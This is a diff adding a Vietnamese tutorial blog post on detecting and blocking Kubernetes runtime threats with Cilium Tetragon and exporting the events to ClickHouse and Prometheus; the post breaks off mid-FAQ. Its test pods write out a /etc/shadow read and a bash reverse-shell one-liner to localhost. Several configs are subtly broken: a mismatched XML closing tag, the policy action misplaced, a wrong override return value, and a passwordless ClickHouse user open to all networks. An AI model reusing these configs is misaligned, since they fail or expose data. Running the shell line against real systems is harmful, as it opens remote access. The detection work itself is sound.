@@ -1,0 +1,784 @@
+---
+title: "Quan sát bảo mật eBPF với Cilium Tetragon: Thực thi runtime theo thời gian thực trong Kubernetes"
+images: ['/static/images/ebpf-cilium-tetragon-kubernetes-security.png']
+date: '2026-10-04'
+lastUpdated: '2026-10-04'
+tags: ["kubernetes", "security", "devops", "cloud", "ebpf"]
+category: Tech
+draft: false
+featured: true
+proficiencyLevel: "Advanced"
+programmingLanguage: "TypeScript"
+summary: "Hướng dẫn toàn diện về quan sát bảo mật eBPF với Cilium Tetragon: thực thi runtime theo thời gian thực trong Kubernetes với kiến trúc cấp độ sản xuất và các ví dụ mã."
+---
+
+Bảo mật thời gian chạy của Kubernetes đòi hỏi khả năng hiển thị và thực thi chi tiết, độ trễ thấp. Các phương pháp truyền thống, dựa vào `ptrace` hoặc các tác nhân không gian người dùng, gây ra chi phí đáng kể và dễ bị né tránh. eBPF, đặc biệt thông qua Cilium Tetragon, cung cấp một giải pháp gốc kernel để quan sát và thực thi bảo mật theo thời gian thực với tác động hiệu suất tối thiểu. Hướng dẫn này trình bày chi tiết việc triển khai nó cho các môi trường Kubernetes sản xuất.
+
+<AudioPlayer src="/static/audio/ebpf-cilium-tetragon-kubernetes-security-vi.mp3" title="Tóm tắt âm thanh cho kỹ sư" voice="Google Cloud vi-VN-Neural2-A" />
+
+
+## eBPF cho Bảo mật Thời gian chạy: Lợi thế của Kernel
+
+eBPF cho phép thực thi các chương trình được đóng hộp cát trong nhân Linux, được kích hoạt bởi nhiều sự kiện khác nhau như syscall, sự kiện mạng và điểm theo dõi kernel. Điều này cung cấp một điểm thuận lợi vô song để giám sát và thực thi bảo mật. Không giống như các tác nhân không gian người dùng, các chương trình eBPF hoạt động trực tiếp trong kernel, quan sát các sự kiện trước khi chúng được xử lý bởi các ứng dụng người dùng, do đó mang lại:
+
+1.  **Không có độ trễ không gian người dùng:** Các sự kiện được thu thập và xử lý trong kernel, loại bỏ việc chuyển đổi ngữ cảnh và sao chép dữ liệu sang không gian người dùng để phân tích ban đầu.
+2.  **Khả năng chống giả mạo:** Các chương trình eBPF được tải vào kernel và khó bị các tiến trình không gian người dùng bị xâm nhập vô hiệu hóa hoặc né tránh.
+3.  **Khả năng hiển thị chi tiết:** Truy cập vào các đối số syscall thô, ngữ cảnh tiến trình và siêu dữ liệu mạng cung cấp thông tin chi tiết về hành vi thời gian chạy.
+4.  **Thực thi động:** Các chương trình eBPF có thể sửa đổi giá trị trả về của syscall, chặn các hoạt động hoặc chèn lỗi, cho phép thực thi theo thời gian thực.
+
+Cilium Tetragon tận dụng eBPF để cung cấp một nền tảng quan sát và thực thi bảo mật gốc Kubernetes. Nó triển khai dưới dạng DaemonSet, gắn các chương trình eBPF vào các hook kernel quan trọng để theo dõi các syscall như `execve`, `openat`, `connect`, `bind` và `accept`.
+
+### Tổng quan Kiến trúc
+
+Kiến trúc của Tetragon rất đơn giản:
+
+```mermaid
+graph TD
+    subgraph Kubernetes Node
+        K[Kernel]
+        TetragonAgent(Tetragon Agent DaemonSet)
+        AppPod1(Application Pod 1)
+        AppPodN(Application Pod N)
+    end
+
+    subgraph Control Plane / Monitoring
+        TetragonOperator(Tetragon Operator)
+        ClickHouse(ClickHouse DB)
+        Prometheus(Prometheus)
+        Grafana(Grafana)
+    end
+
+    AppPod1 -- Syscalls --> K
+    AppPodN -- Syscalls --> K
+    K -- eBPF Tracepoints --> TetragonAgent
+    TetragonAgent -- JSON Events --> ClickHouse
+    TetragonAgent -- Metrics --> Prometheus
+    Prometheus -- Scrapes --> Grafana
+    TetragonOperator -- Manages --> TetragonAgent
+    TetragonOperator -- Manages --> TracingPolicy CRDs
+```
+
+`Tetragon Agent` chạy trên mỗi node, tải các chương trình eBPF. Các chương trình này thu thập các sự kiện, lọc chúng dựa trên các CRD `TracingPolicy`, sau đó truyền các sự kiện JSON có cấu trúc ra đầu ra tiêu chuẩn hoặc một sink được cấu hình. `Tetragon Operator` quản lý vòng đời của các tác nhân và xử lý các đối tượng `TracingPolicy`.
+
+## Triển khai Cilium Tetragon
+
+Giả sử một cụm Kubernetes hoạt động với quyền truy cập `kubectl`, hãy triển khai Tetragon bằng Helm.
+
+```bash
+# Add Cilium Helm repository
+helm repo add cilium https://helm.cilium.io/
+
+# Update Helm repositories
+helm repo update
+
+# Install Tetragon
+# Ensure your kernel headers are available on nodes for eBPF compilation.
+# For GKE, AKS, EKS, this is typically handled. For custom kernels, you might need to install them.
+helm install tetragon cilium/tetragon --namespace kube-system \
+  --set tetragon.exporter.stdout.enabled=true \
+  --set tetragon.exporter.otlp.url="grpc://otel-collector.observability.svc.cluster.local:4317" \
+  --set tetragon.exporter.otlp.enabled=false # We'll enable this later for ClickHouse
+```
+
+Xác minh việc triển khai:
+
+```bash
+kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon
+```
+
+Bạn sẽ thấy các pod tác nhân Tetragon đang chạy trên mỗi node.
+
+## Định nghĩa Chính sách Bảo mật với `TracingPolicy`
+
+`TracingPolicy` là một Định nghĩa Tài nguyên Tùy chỉnh (CRD) của Kubernetes định nghĩa các sự kiện kernel nào cần theo dõi và những hành động nào cần thực hiện.
+
+### Ví dụ 1: Phát hiện truy cập tệp nhạy cảm (`/etc/shadow`)
+
+Chính sách này theo dõi các syscall `openat` và đặc biệt tìm kiếm các nỗ lực mở `/etc/shadow`.
+
+```yaml
+# sensitive-file-access.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-shadow-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int" # dirfd
+    - index: 1
+      type: "string" # pathname
+    - index: 2
+      type: "int" # flags
+    - index: 3
+      type: "int" # mode
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Equal"
+        values:
+        - "/etc/shadow"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1 # Exclude PID 1 (init process) to reduce noise
+    action: "Follow" # Log the event
+```
+
+Áp dụng chính sách:
+
+```bash
+kubectl apply -f sensitive-file-access.yaml
+```
+
+Bây giờ, hãy kiểm tra nó. Triển khai một pod đơn giản và thử đọc `/etc/shadow`.
+
+```yaml
+# test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: shadow-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "cat /etc/shadow || echo 'Access denied'"]
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f test-pod.yaml
+kubectl wait --for=condition=complete pod/shadow-test --timeout=60s
+kubectl logs shadow-test
+```
+
+Trong một terminal riêng biệt, quan sát nhật ký Tetragon:
+
+```bash
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "openat" | grep "/etc/shadow"
+```
+
+Bạn sẽ thấy đầu ra JSON tương tự như sau (đã cắt bớt để ngắn gọn):
+
+```json
+{"event":{"open":{"args":[{"index":0,"type":"int","value":-100},{"index":1,"type":"string","value":"/etc/shadow"},{"index":2,"type":"int","value":0},{"index":3,"type":"int","value":0}],"fd":3,"flags":"O_RDONLY","path":"/etc/shadow","pid":12345,"process_id":"shadow-test/busybox","tid":12345,"uid":0}},"node_name":"k8s-node-1","process":{"exec_id":"...","pod":{"container":{"id":"...","name":"busybox"},"name":"shadow-test","namespace":"default"}},"type":"process_open"}
+```
+
+Điều này chứng minh việc phát hiện truy cập tệp nhạy cảm theo thời gian thực.
+
+### Ví dụ 2: Phát hiện thực thi Reverse Shell
+
+Reverse shell thường liên quan đến `execve` các tệp nhị phân shell phổ biến (`bash`, `sh`, `nc`) sau đó là các kết nối mạng. Chính sách này tập trung vào `execve` các tệp nhị phân đáng ngờ.
+
+```yaml
+# reverse-shell-exec.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-reverse-shell-exec
+spec:
+  kprobes:
+  - call: "execve"
+    args:
+    - index: 0
+      type: "string" # filename
+    - index: 1
+      type: "string[]" # argv
+    selectors:
+    - matchArgs:
+      - index: 0
+        operator: "In"
+        values:
+        - "/bin/bash"
+        - "/bin/sh"
+        - "/usr/bin/nc"
+        - "/usr/bin/ncat"
+        - "/usr/bin/python"
+        - "/usr/bin/perl"
+        - "/usr/bin/php"
+        - "/usr/bin/ruby"
+        - "/usr/bin/zsh"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Follow"
+```
+
+Áp dụng chính sách:
+
+```bash
+kubectl apply -f reverse-shell-exec.yaml
+```
+
+Kiểm tra nó:
+
+```yaml
+# reverse-shell-test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1 || echo 'Simulated reverse shell'"]
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f reverse-shell-test-pod.yaml
+kubectl wait --for=condition=complete pod/reverse-shell-test --timeout=60s
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "execve" | grep "/bin/bash"
+```
+
+Bạn sẽ quan sát các sự kiện `execve` cho `/bin/bash`. Để phát hiện mạnh mẽ hơn, bạn sẽ kết hợp điều này với việc theo dõi syscall `connect` để xác định các kết nối đi đến các cổng bất thường hoặc IP bên ngoài.
+
+### Ví dụ 3: Phát hiện thoát khỏi Namespace (Gắn đường dẫn máy chủ)
+
+Một kỹ thuật thoát khỏi namespace phổ biến liên quan đến việc gắn các đường dẫn máy chủ. Mặc dù điều này thường được kiểm soát bởi Tiêu chuẩn Bảo mật Pod, việc phát hiện các nỗ lực truy cập các đường dẫn máy chủ nhạy cảm từ bên trong một container là rất quan trọng. Chính sách này theo dõi `openat` trên các đường dẫn máy chủ phổ biến.
+
+```yaml
+# host-path-access.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: detect-host-path-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int"
+    - index: 1
+      type: "string"
+    - index: 2
+      type: "int"
+    - index: 3
+      type: "int"
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Prefix"
+        values:
+        - "/host/proc"
+        - "/host/sys"
+        - "/host/var/lib/docker"
+        - "/host/var/log"
+        - "/host/etc/kubernetes"
+        - "/host/root"
+        - "/host/boot"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Follow"
+```
+
+Áp dụng chính sách:
+
+```bash
+kubectl apply -f host-path-access.yaml
+```
+
+Kiểm tra nó bằng cách triển khai một pod với một gắn đường dẫn máy chủ:
+
+```yaml
+# host-path-test-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: host-path-test
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["sh", "-c", "ls -la /host/proc/self/cgroup || echo 'Host path access attempt'"]
+    volumeMounts:
+    - name: host-proc
+      mountPath: /host/proc
+  volumes:
+  - name: host-proc
+    hostPath:
+      path: /proc
+      type: Directory
+  restartPolicy: Never
+```
+
+```bash
+kubectl apply -f host-path-test-pod.yaml
+kubectl wait --for=condition=complete pod/host-path-test --timeout=60s
+kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -f | grep "openat" | grep "/host/proc/self/cgroup"
+```
+
+Điều này sẽ ghi lại các nỗ lực truy cập `/host/proc/self/cgroup`.
+
+## Thực thi theo thời gian thực với `TracingPolicy`
+
+Ngoài việc ghi nhật ký đơn thuần, Tetragon có thể thực thi các chính sách bằng cách chấm dứt các tiến trình hoặc chặn các syscall.
+
+### Ví dụ: Chặn truy cập tệp nhạy cảm
+
+Sửa đổi chính sách `detect-shadow-access` để chặn lệnh gọi `openat`.
+
+```yaml
+# sensitive-file-access-block.yaml
+apiVersion: cilium.io/v1alpha1
+kind: TracingPolicy
+metadata:
+  name: block-shadow-access
+spec:
+  kprobes:
+  - call: "openat"
+    args:
+    - index: 0
+      type: "int"
+    - index: 1
+      type: "string"
+    - index: 2
+      type: "int"
+    - index: 3
+      type: "int"
+    selectors:
+    - matchArgs:
+      - index: 1
+        operator: "Equal"
+        values:
+        - "/etc/shadow"
+      matchPIDs:
+      - operator: NotEqual
+        followForks: true
+        isNamespacePID: true
+        values:
+        - 1
+    action: "Override" # This will block the syscall
+    return:
+      isErr: true
+      value: 1 # EPERM (Operation not permitted)
+```
+
+Áp dụng chính sách chặn (đảm bảo `detect-shadow-access` trước đó đã bị xóa hoặc cập nhật):
+
+```bash
+kubectl delete -f sensitive-file-access.yaml
+kubectl apply -f sensitive-file-access-block.yaml
+```
+
+Chạy lại pod `shadow-test`:
+
+```bash
+kubectl delete pod shadow-test
+kubectl apply -f test-pod.yaml
+kubectl wait --for=condition=complete pod/shadow-test --timeout=60s
+kubectl logs shadow-test
+```
+
+Đầu ra từ `kubectl logs shadow-test` bây giờ sẽ hiển thị "Access denied" hoặc một lỗi tương tự, cho biết lệnh `cat` không thể mở `/etc/shadow`. Nhật ký Tetragon sẽ hiển thị sự kiện `openat` với hành động `Override`.
+
+## Xuất nhật ký kiểm toán sang ClickHouse
+
+Để lưu trữ, phân tích và cảnh báo dài hạn, việc xuất các sự kiện Tetragon sang một cơ sở dữ liệu mạnh mẽ như ClickHouse là rất cần thiết. Điều này yêu cầu một OpenTelemetry Collector.
+
+### 1. Triển khai OpenTelemetry Collector
+
+```yaml
+# otel-collector.yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: otel-collector
+  namespace: observability
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: otel-collector
+rules:
+- apiGroups: [""]
+  resources: ["pods", "nodes", "namespaces"]
+  verbs: ["get", "list", "watch"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: otel-collector
+subjects:
+- kind: ServiceAccount
+  name: otel-collector
+  namespace: observability
+roleRef:
+  kind: ClusterRole
+  name: otel-collector
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: otel-collector-config
+  namespace: observability
+data:
+  otel-collector-config.yaml: |
+    receivers:
+      otlp:
+        protocols:
+          grpc:
+          http:
+    processors:
+      batch:
+        send_batch_size: 1000
+        timeout: 5s
+    exporters:
+      clickhouse:
+        endpoint: "tcp://clickhouse-server.observability.svc.cluster.local:9000"
+        database: "tetragon_events"
+        table: "events"
+        username: "default"
+        password: "" # Use K8s secrets for production
+        tls:
+          insecure: true # Use proper TLS in production
+    service:
+      pipelines:
+        logs:
+          receivers: [otlp]
+          processors: [batch]
+          exporters: [clickhouse]
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: otel-collector
+  namespace: observability
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: otel-collector
+  template:
+    metadata:
+      labels:
+        app: otel-collector
+    spec:
+      serviceAccountName: otel-collector
+      containers:
+      - name: otel-collector
+        image: otel/opentelemetry-collector-contrib:latest
+        command: ["/otelcol-contrib", "--config=/conf/otel-collector-config.yaml"]
+        volumeMounts:
+        - name: otel-collector-config-vol
+          mountPath: /conf
+        ports:
+        - containerPort: 4317 # OTLP gRPC
+        - containerPort: 4318 # OTLP HTTP
+      volumes:
+      - name: otel-collector-config-vol
+        configMap:
+          name: otel-collector-config
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: otel-collector
+  namespace: observability
+spec:
+  selector:
+    app: otel-collector
+  ports:
+  - name: otlp-grpc
+    protocol: TCP
+    port: 4317
+    targetPort: 4317
+  - name: otlp-http
+    protocol: TCP
+    port: 4318
+    targetPort: 4318
+```
+
+Tạo namespace `observability` và áp dụng:
+
+```bash
+kubectl create namespace observability
+kubectl apply -f otel-collector.yaml
+```
+
+### 2. Triển khai ClickHouse
+
+Để đơn giản, một triển khai ClickHouse một node. Trong sản xuất, hãy sử dụng một thiết lập có tính sẵn sàng cao.
+
+```yaml
+# clickhouse.yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: clickhouse
+  namespace: observability
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: clickhouse-server
+  namespace: observability
+spec:
+  selector:
+    matchLabels:
+      app: clickhouse-server
+  template:
+    metadata:
+      labels:
+        app: clickhouse-server
+    spec:
+      serviceAccountName: clickhouse
+      containers:
+      - name: clickhouse-server
+        image: clickhouse/clickhouse-server:latest
+        ports:
+        - containerPort: 8123 # HTTP
+        - containerPort: 9000 # Client
+        - containerPort: 9009 # Inter-server
+        volumeMounts:
+        - name: clickhouse-storage
+          mountPath: /var/lib/clickhouse
+        - name: clickhouse-config
+          mountPath: /etc/clickhouse-server/config.d
+        - name: clickhouse-users
+          mountPath: /etc/clickhouse-server/users.d
+      volumes:
+      - name: clickhouse-storage
+        emptyDir: {} # Use PersistentVolumeClaim in production
+      - name: clickhouse-config
+        configMap:
+          name: clickhouse-config
+      - name: clickhouse-users
+        configMap:
+          name: clickhouse-users
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: clickhouse-server
+  namespace: observability
+spec:
+  selector:
+    app: clickhouse-server
+  ports:
+  - name: http
+    protocol: TCP
+    port: 8123
+    targetPort: 8123
+  - name: client
+    protocol: TCP
+    port: 9000
+    targetPort: 9000
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: clickhouse-config
+  namespace: observability
+data:
+  logging.xml: |
+    <yandex>
+        <logger>
+            <level>trace</level>
+            <log>/var/log/clickhouse-server/clickhouse-server.log</log>
+            <errorlog>/var/log/clickhouse-server/clickhouse-server.err.log</log>
+            <size_log>1000M</size_log>
+            <count_log>10</count_log>
+        </logger>
+    </yandex>
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: clickhouse-users
+  namespace: observability
+data:
+  users.xml: |
+    <yandex>
+        <users>
+            <default>
+                <password></password>
+                <networks>
+                    <ip>::/0</ip>
+                </networks>
+                <profile>default</profile>
+                <quota>default</quota>
+            </default>
+        </users>
+    </yandex>
+```
+
+```bash
+kubectl apply -f clickhouse.yaml
+```
+
+Chờ ClickHouse sẵn sàng. Sau đó, kết nối và tạo cơ sở dữ liệu và bảng:
+
+```bash
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "CREATE DATABASE IF NOT EXISTS tetragon_events;"
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "
+CREATE TABLE IF NOT EXISTS tetragon_events.events (
+    Timestamp DateTime64(9),
+    NodeName String,
+    EventType String,
+    ProcessExecID String,
+    ProcessPID UInt64,
+    ProcessTID UInt64,
+    ProcessUID UInt64,
+    ProcessName String,
+    ProcessArgs Array(String),
+    ProcessCwd String,
+    ProcessPodNamespace String,
+    ProcessPodName String,
+    ProcessContainerName String,
+    EventData String
+) ENGINE = MergeTree()
+ORDER BY (Timestamp, NodeName, EventType)
+SETTINGS index_granularity = 8192;
+"
+```
+
+### 3. Cấu hình Tetragon để xuất sang OTLP
+
+Cập nhật bản phát hành Helm của Tetragon để bật xuất OTLP:
+
+```bash
+helm upgrade tetragon cilium/tetragon --namespace kube-system \
+  --set tetragon.exporter.stdout.enabled=false \
+  --set tetragon.exporter.otlp.url="otel-collector.observability.svc.cluster.local:4317" \
+  --set tetragon.exporter.otlp.enabled=true
+```
+
+Bây giờ, hãy chạy lại các pod thử nghiệm của bạn. Các sự kiện sẽ chảy qua OpenTelemetry Collector đến ClickHouse. Bạn có thể truy vấn ClickHouse để xem dữ liệu:
+
+```bash
+kubectl exec -it deployment/clickhouse-server -n observability -- clickhouse-client -q "SELECT * FROM tetragon_events.events LIMIT 10;"
+```
+
+## Xuất số liệu sang Prometheus/Grafana
+
+Tetragon hiển thị các số liệu Prometheus. Bạn sẽ cần một phiên bản Prometheus được cấu hình để thu thập các pod Tetragon.
+
+### 1. Triển khai Prometheus (nếu chưa có)
+
+Giả sử một triển khai Prometheus Operator tiêu chuẩn, bạn sẽ tạo một `ServiceMonitor`.
+
+```yaml
+# prometheus-servicemonitor.yaml
+apiVersion: monitoring.coreos.com/v1
+kind: ServiceMonitor
+metadata:
+  name: tetragon-servicemonitor
+  namespace: kube-system # Or your monitoring namespace
+  labels:
+    release: prometheus-operator # Match your Prometheus operator's selector
+spec:
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: tetragon
+  namespaceSelector:
+    matchNames:
+    - kube-system
+  endpoints:
+  - port: metrics
+    interval: 30s
+    path: /metrics
+```
+
+Áp dụng `ServiceMonitor` này. Prometheus sẽ tự động phát hiện và thu thập các số liệu Tetragon.
+
+### 2. Bảng điều khiển Grafana
+
+Nhập các bảng điều khiển Tetragon được xây dựng sẵn vào Grafana hoặc tạo các bảng điều khiển tùy chỉnh. Các số liệu chính bao gồm:
+
+*   `tetragon_events_total`: Tổng số sự kiện đã xử lý.
+*   `tetragon_policy_events_total`: Các sự kiện khớp với một chính sách.
+*   `tetragon_policy_actions_total`: Tổng số hành động đã thực hiện (ví dụ: `Override`).
+*   `tetragon_bpf_progs_total`: Số lượng chương trình eBPF đã tải.
+*   `tetragon_bpf_map_entries_total`: Các mục bản đồ eBPF.
+
+Các số liệu này cung cấp thông tin chi tiết về tình trạng hoạt động và hiệu quả chính sách của Tetragon.
+
+## So sánh Chính sách Bảo mật
+
+| Tính năng           | Tác nhân không gian người dùng truyền thống (ví dụ: Falco, OSSEC) | Cilium Tetragon (eBPF)                                |
+| :------------------ | :------------------------------------------------ | :---------------------------------------------------- |
+| **Cơ chế**          | `ptrace`, auditd, mô-đun kernel, hook không gian người dùng | Các chương trình eBPF được gắn vào tracepoint/kprobe kernel |
+| **Độ trễ**          | Cao (chuyển đổi ngữ cảnh, sao chép dữ liệu)            | Gần bằng không (xử lý trong kernel)                      |
+| **Chi phí**         | CPU/bộ nhớ đáng kể                            | CPU/bộ nhớ tối thiểu                                    |
+| **Khả năng chống giả mạo** | Dễ bị tấn công không gian người dùng                  | Cao (cấp kernel, đóng hộp cát)                        |
+| **Độ chi tiết**     | Tốt, nhưng thường là sau sự kiện                        | Tuyệt vời (trước syscall, đối số thô)                |
+| **Thực thi**        | Hạn chế (giết tiến trình, quy tắc tường lửa)            | Chi tiết (chặn syscall, sửa đổi giá trị trả về)|
+| **Triển khai**      | DaemonSet, yêu cầu các mô-đun kernel cụ thể       | DaemonSet, tận dụng các tính năng kernel eBPF tiêu chuẩn    |
+| **Gốc Kubernetes**  | Thường yêu cầu tích hợp tùy chỉnh                | CRD Kubernetes hạng nhất (`TracingPolicy`)         |
+
+## Các vấn đề và khắc phục sự cố trong sản xuất
+
+1.  **Không khớp tiêu đề Kernel:**
+    *   **Triệu chứng:** Các pod Tetragon không khởi động được, nhật ký hiển thị lỗi như "failed to load BPF program: kernel headers not found" hoặc "BPF compilation failed."
+    *   **Nguyên nhân:** Các chương trình eBPF được biên dịch dựa trên các tiêu đề của kernel đang chạy. Nếu các tiêu đề bị thiếu hoặc không khớp với phiên bản kernel, quá trình biên dịch sẽ thất bại.
+    *   **Khắc phục:** Đảm bảo các tiêu đề kernel được cài đặt trên tất cả các node và khớp với phiên bản kernel chính xác. Đối với các nhà cung cấp đám mây, điều này thường được quản lý, nhưng đối với các AMI tùy chỉnh hoặc tại chỗ, bạn có thể cần cài đặt `linux-headers-$(uname -r)` hoặc các gói tương tự. Một số bản phân phối yêu cầu `kernel-devel` hoặc `kernel-headers`.
+
+2.  **Khối lượng sự kiện quá lớn:**
+    *   **Triệu chứng:** Nhật ký Tetragon quá tải, bộ thu OTLP bị tồn đọng, việc nhập dữ liệu vào ClickHouse gặp khó khăn, sử dụng CPU/bộ nhớ cao trên các tác nhân Tetragon.
+    *   **Nguyên nhân:** Các định nghĩa `TracingPolicy` quá rộng (ví dụ: theo dõi tất cả các lệnh gọi `openat` mà không có bộ lọc cụ thể) có thể tạo ra hàng triệu sự kiện mỗi giây.
+    *   **Khắc phục:**
+        *   **Tinh chỉnh chính sách:** Cụ thể hóa cao với `matchArgs`, `matchPIDs` và `matchNamespaces`. Sử dụng các toán tử `Prefix` hoặc `Suffix` khi thích hợp.
+        *   **Giới hạn tốc độ:** Tetragon có giới hạn tốc độ nội bộ. Cấu hình `tetragon.eventRateLimit` trong các giá trị Helm.
+        *   **Gộp nhóm:** Đảm bảo bộ thu OTLP của bạn có cấu hình gộp nhóm thích hợp (bộ xử lý `batch`).
+        *   **Lấy mẫu:** Đối với các sự kiện có khối lượng lớn, hãy xem xét lấy mẫu xác suất nếu không yêu cầu độ trung thực đầy đủ cho tất cả các sự kiện.
+
+3.  **Chính sách không kích hoạt:**
+    *   **Triệu chứng:** Các sự kiện dự kiến sẽ được một `TracingPolicy` bắt giữ không xuất hiện trong nhật ký hoặc ClickHouse.
+    *   **Nguyên nhân:**
+        *   YAML `TracingPolicy` không chính xác (ví dụ: tên syscall sai, chỉ mục/kiểu đối số không chính xác, lỗi logic `matchArgs`).
+        *   Tiến trình đang chạy trong một namespace/container khác so với dự kiến.
+        *   Syscall thực sự không được thực hiện (ví dụ: `cat` sử dụng `openat`, không phải `open`).
+    *   **Khắc phục:**
+        *   **Xác minh Syscall:** Sử dụng `strace` trên một tệp nhị phân thử nghiệm để xác nhận các syscall và đối số chính xác.
+        *   **Kiểm tra nhật ký tác nhân Tetragon:** Tìm kiếm lỗi khi áp dụng chính sách.
+        *   **Bắt đầu rộng, sau đó tinh chỉnh:** Bắt đầu với một chính sách rất rộng (ví dụ: theo dõi tất cả `execve`) và sau đó thêm các bộ chọn `matchArgs` và `matchPIDs`.
+        *   **`isNamespacePID: true`:** Hãy nhớ rằng PID bên trong một container là dành riêng cho namespace. Nếu bạn đang khớp với PID máy chủ, hãy đặt `isNamespacePID: false`.
+
+4.  **Thực thi (`Override`) gây ra sự cố ứng dụng:**
+    *   **Triệu chứng:** Ứng dụng gặp sự cố hoặc hoạt động không mong muốn sau khi áp dụng chính sách `Override`.
+    *   **Nguyên nhân:** Chặn một syscall quan trọng mà một ứng dụng thực sự cần.
+    *   **Khắc phục:**
+        *   **Kiểm tra kỹ lưỡng:** Luôn kiểm tra các chính sách `Override` trong môi trường không sản xuất trước.
+        *   **Sử dụng `Follow` trước:** Bắt đầu với `action: Follow` để quan sát các sự kiện và đảm bảo chính sách của bạn chỉ khớp với hành vi độc hại.
+        *   **Danh sách trắng chi tiết:** Nếu một ứng dụng cần thực hiện một hành động nhạy cảm, hãy tạo một `TracingPolicy` cụ thể để đưa hành động chính xác đó vào danh sách trắng cho ứng dụng cụ thể đó (ví dụ: theo `podLabels` hoặc `containerName`).
+
+5.  **Tiêu thụ tài nguyên trên Control Plane (ClickHouse/Prometheus):**
+    *   **Triệu chứng:** Các phiên bản ClickHouse hoặc Prometheus bị quá tải do khối lượng dữ liệu Tetragon.
+    *   **Nguyên nhân:** Tốc độ sự kiện cao từ Tetragon, tài nguyên không đủ được phân bổ cho các hệ thống phụ trợ.
+    *   **Khắc phục:**
+        *   **Tối ưu hóa chính sách Tetragon:** Giảm khối lượng sự kiện tại nguồn.
+        *   **Mở rộng phụ trợ:** Mở rộng theo chiều dọc hoặc chiều ngang ClickHouse và Prometheus.
+        *   **Tối ưu hóa ClickHouse:** Tối ưu hóa lược đồ bảng, sử dụng các công cụ thích hợp (ví dụ: `MergeTree`) và xem xét phân vùng.
+        *   **Giữ lại Prometheus:** Điều chỉnh các chính sách giữ lại Prometheus để quản lý việc sử dụng đĩa.
+
+## Các câu hỏi thường gặp
+
+1.  **Chi phí hiệu suất của Tetragon là gì?**
+    Tetragon, dựa trên eBPF, có chi phí tối thiểu. Các chương trình eBPF thực thi trực tiếp trong kernel, tránh chuyển đổi ngữ cảnh và sao chép dữ liệu sang không gian người dùng. Các điểm chuẩn thường cho thấy chi phí CPU một chữ số phần trăm, ngay cả dưới tải sự kiện cao, làm cho nó hiệu quả hơn đáng kể so với các tác nhân dựa trên `ptrace` hoặc không gian người dùng.
+
+2.  **Tetragon có thể chặn kết nối mạng không?**
+    Có, Tetragon có thể chặn kết nối mạng bằng cách ghi đè các syscall như `connect`, `bind` hoặc `accept`. Bạn có thể định nghĩa các quy tắc `TracingPolicy` để khớp với các IP đích, cổng hoặc ngữ cảnh tiến trình cụ thể và sau đó sử dụng `action: Override` để trả về lỗi (ví dụ: `EPERM`) cho tiến trình gọi.
+
+3.  **Tetragon so sánh với Falco như thế nào?**
+    Cả Falco và Tetragon đều cung cấp bảo mật thời gian chạy. Falco truyền thống sử dụng các mô-đun kernel (`falco-probe`) hoặc `ptrace` để móc vào các syscall và tạo ra các sự kiện dựa trên các quy tắc do người dùng định nghĩa. Tetragon độc quyền sử dụng eBPF. Tetragon thường cung cấp chi phí thấp hơn, kiểm soát chi tiết hơn đối với các đối số syscall và khả năng thực thi trực tiếp trong kernel (chặn/ghi đè syscall) mà khó đạt được hơn với kiến trúc truyền thống của Falco. Falco có một bộ quy tắc và cộng đồng rộng hơn, nhưng Tetragon đang nhanh chóng bắt kịp, đặc biệt đối với các trường hợp sử dụng gốc Kubernetes.
+
+4.  **Tetragon chỉ dành cho Kubernetes?**
+    Mặc dù Tetragon được tích hợp sâu với Kubernetes (sử dụng CRD, ngữ cảnh pod/container), công nghệ eBPF cơ bản và tác nhân Tetragon có thể được triển khai trên bất kỳ máy chủ Linux nào để giám sát và thực thi các chính sách. Việc tích hợp Kubernetes chủ yếu cung cấp CRD `TracingPolicy` và làm phong phú các sự kiện với siêu dữ liệu Kubernetes.
+
+5.  **Làm cách nào để quản lý chính sách ở quy mô lớn trên nhiều cụm?**
